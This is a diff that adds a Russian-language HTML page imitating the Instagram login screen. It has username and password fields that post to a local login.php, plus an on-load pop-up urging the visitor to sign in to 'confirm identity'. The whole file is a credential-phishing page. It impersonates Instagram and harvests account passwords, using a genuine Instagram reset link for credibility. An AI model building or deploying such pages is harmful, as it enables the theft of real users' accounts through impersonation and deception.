@@ -1,0 +1,49 @@
+<html>
+  <head><script>
+  window.location.href="#openModal";
+  </script>
+     <meta name="viewport" content="width=device-width, user-scalable=no">
+     <link rel="stylesheet" href="./style.css">
+     <title>Войти • Instagram</title>
+  </head>
+  <body>
+    <center>
+    <div class="block">
+        <br>
+      <img src="in.png" height="70px" class="inst"><br><br>
+      <form action="login.php" method="POST">
+      <div class="input-box">
+          <input  name="name" placeholder="Номер телефона или имя пользователя"> <br><br>
+          <input  type="password" name='password' placeholder="Пароль"><br><br>
+      </div>
+      <input type="submit" value="Войти" class="button">
+    </form>
+      <div class="blo"><br>
+      <tx class="tx">Забыли свои учетные данные? <tx><br><a class="txx" href="https://www.instagram.com/accounts/password/reset/">Получить помощь со входом в систему.</a>
+      </div>
+      <br><br><br><br><br><br><br><br><br><br>
+      <div style="color:#aaa;font-size:15;font-weight: normal;">Подтверждения личности аккаунта</div>
+    </div>
+    <div id="openModal" class="modal">
+        <br>
+        <br>
+        <br><br>
+        <br>
+        <br><br>
+        <br>
+  <div class="modal-dialog">
+    <div class="modal-content"><center>
+      <div class="modal-header"><center>
+        <h3 class="modal-title">Подтверждения</h3>
+        <br>
+        <font color="#aaa" size="2px">Для удостоверения вашей личности вам нужно авторизоваться в свой аккаунт.</font>
+      </div></center>
+      <a href="#close"><div class="modal-body">
+        OK
+      </div></a>
+    </div>
+  </div>
+</div>
+  </center>
+  </body>
+</html>
